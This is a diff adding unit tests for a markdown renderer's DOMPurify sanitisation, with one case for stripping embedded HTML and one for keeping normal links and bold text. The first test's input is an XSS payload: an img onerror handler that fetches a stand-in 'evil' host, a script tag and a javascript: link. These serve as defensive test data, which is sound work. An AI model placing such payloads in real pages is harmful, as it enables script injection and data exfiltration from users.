@@ -24,6 +24,29 @@ describe('renderMarkdown', () => {
   })
 })
 
+describe('renderMarkdown sanitize (DOMPurify)', () => {
+  it('strips event handlers and script tags from embedded HTML', () => {
+    const html = renderMarkdown(
+      '<img src=x onerror="fetch(\'https://evil/?t=1\')"><script>alert(1)</script><a href="javascript:alert(1)">link</a>',
+    )
+
+    expect(html).not.toContain('onerror')
+    expect(html).not.toContain('<script')
+    expect(html).not.toContain('javascript:')
+    // img 标签本身保留（仅去危险属性），内容不丢
+    expect(html).toContain('<img src="x">')
+  })
+
+  it('keeps normal embedded HTML and markdown links working', () => {
+    const html = renderMarkdown(
+      '看 [文档](https://example.com/docs) 与 <b>加粗</b> 段落',
+    )
+
+    expect(html).toContain('<a href="https://example.com/docs"')
+    expect(html).toContain('<b>加粗</b>')
+  })
+})
+
 describe('renderMarkdown math (KaTeX)', () => {
   it('renders inline math with $...$', () => {
     const html = renderMarkdown('矩阵 $M \\in \\mathbb{R}^{n \\times n}$ 是正定的')
